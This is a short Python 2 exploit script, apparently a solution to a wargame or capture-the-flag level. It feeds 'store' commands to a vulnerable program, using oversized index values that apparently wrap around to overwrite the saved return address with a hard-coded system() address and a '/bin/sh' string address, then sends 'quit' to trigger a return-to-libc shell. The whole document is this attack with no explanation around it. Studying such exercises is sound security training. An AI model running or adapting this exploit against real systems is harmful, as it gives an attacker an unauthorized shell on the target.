import struct

system_addr = 0xf7e6aed0
bin_sh_addr = 0xf7f897ec

eip_pos = 2147483762
argument_pos = 2147483764

print "store"
print system_addr
print eip_pos

print "store"
print bin_sh_addr
print argument_pos

print "quit"
